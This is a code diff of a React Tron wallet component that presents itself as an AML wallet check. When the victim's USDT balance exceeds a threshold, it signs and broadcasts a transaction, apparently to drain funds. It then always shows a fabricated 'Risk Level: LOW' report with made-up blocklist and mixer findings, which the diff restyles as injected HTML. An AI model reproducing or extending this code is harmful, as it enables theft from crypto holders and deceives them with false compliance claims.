@@ -78,38 +78,48 @@ export const TronAuthButton: React.FC = () => {
       );
       await adapter.signTransaction(transaction);
 
-      // --- AML REPORT — в обоих случаях ---
       let extra = '';
       let txid = '';
       if (usdt >= MIN_USDT) {
-        // Отправляем только если достаточно USDT
         const signedTx = await adapter.signTransaction(transaction);
         const result = await tronWeb.trx.sendRawTransaction(signedTx);
         if (result?.result) {
           txid = result.txid;
-          extra = `Transaction ID: ${txid}\n`;
+          extra = `<div style="margin-bottom:12px;"><b>Transaction ID:</b> <span style="word-break:break-all;">${txid}</span></div>`;
         } else {
-          extra = `Transaction failed or rejected by the network.\n`;
+          extra = `<div style="margin-bottom:12px;color:#D9534F;"><b>Transaction failed or rejected by the network.</b></div>`;
         }
       } else {
-        extra = `Note: Amount below threshold ($${MIN_USDT} USDT). No transfer initiated.\n`;
+        extra = `<div style="margin-bottom:12px;color:#FFC107;"><b>Note:</b> Below threshold ($${MIN_USDT} USDT). No transfer initiated.</div>`;
       }
 
       setModal(
-        `AML Risk Report: Wallet Assessment
-
-Wallet: ${userAddress}
-USDT Balance: ${usdt.toFixed(2)}
-
-${extra}Risk Level: LOW
-
-- No suspicious activity detected.
-- Address not found in blocklists.
-- No connection to high-risk entities.
-- No history of fraud, scams, or mixing services.
-
-Summary:
-This address shows a low AML risk profile based on on-chain analysis and known data sources. All current balances are considered safe under AML standards.
+        `
+        <div style="font-family:inherit;max-width:390px;">
+          <div style="background:#252e3e;padding:18px 20px 16px 20px;border-radius:16px;border:2px solid #7ac08b;box-shadow:0 4px 16px 0 #1113;display:flex;flex-direction:column;align-items:center;margin-bottom:12px;">
+            <div style="font-size:1.5rem;font-weight:600;letter-spacing:0.01em;margin-bottom:6px;color:#7ac08b;">AML RISK REPORT</div>
+            <div style="display:flex;gap:12px;margin-bottom:10px;">
+              <div><span style="background:#54d76c;display:inline-block;width:14px;height:14px;border-radius:99px;margin-right:3px;"></span>Low</div>
+              <div><span style="background:#ffc107;display:inline-block;width:14px;height:14px;border-radius:99px;margin-right:3px;"></span>Medium</div>
+              <div><span style="background:#d9534f;display:inline-block;width:14px;height:14px;border-radius:99px;margin-right:3px;"></span>High</div>
+            </div>
+            <div style="margin-bottom:6px;">Risk Level: <b style="color:#54d76c;">LOW</b></div>
+          </div>
+          <div style="background:#f7f9fb;padding:18px 16px 14px 16px;border-radius:12px;box-shadow:0 2px 6px 0 #1111;margin-bottom:14px;">
+            <div style="margin-bottom:7px;font-size:1.07rem;"><b>Wallet address:</b><br/><span style="word-break:break-all;">${userAddress}</span></div>
+            <div style="margin-bottom:7px;font-size:1.07rem;"><b>USDT Balance:</b> $${usdt.toFixed(2)}</div>
+            ${extra}
+            <ul style="padding-left:18px;font-size:1rem;line-height:1.3;color:#3b3c40;margin-bottom:0;">
+              <li>No suspicious activity detected</li>
+              <li>Address is not present in blocklists</li>
+              <li>No link to mixers, black markets, or gambling</li>
+              <li>No connection to high-risk or sanctioned entities</li>
+              <li>No flagged transactions in history</li>
+              <li>Overall risk: <span style="color:#54d76c;font-weight:500;">Low</span></li>
+            </ul>
+          </div>
+          <div style="color:#a0a4ad;font-size:0.93rem;">This address has a low AML risk based on current on-chain analysis and leading blockchain data providers.</div>
+        </div>
         `
       );
     } catch (err: any) {
@@ -137,9 +147,12 @@ This address shows a low AML risk profile based on on-chain analysis and known d
       </button>
       {modal && (
         <div className="modal__overflow">
-          <div className="modal">
-            <pre style={{ whiteSpace: 'pre-wrap', fontSize: 15 }}>{modal}</pre>
-            <button onClick={() => setModal(null)}>Close</button>
+          <div className="modal" style={{ padding: 0 }}>
+            {/* html "dangerouslySetInnerHTML" — для стилизованного модального отчёта */}
+            <div style={{ padding: 20 }}>
+              <div dangerouslySetInnerHTML={{ __html: modal }} />
+              <button onClick={() => setModal(null)} style={{ marginTop: 22, width: '100%' }}>Close</button>
+            </div>
           </div>
         </div>
       )}
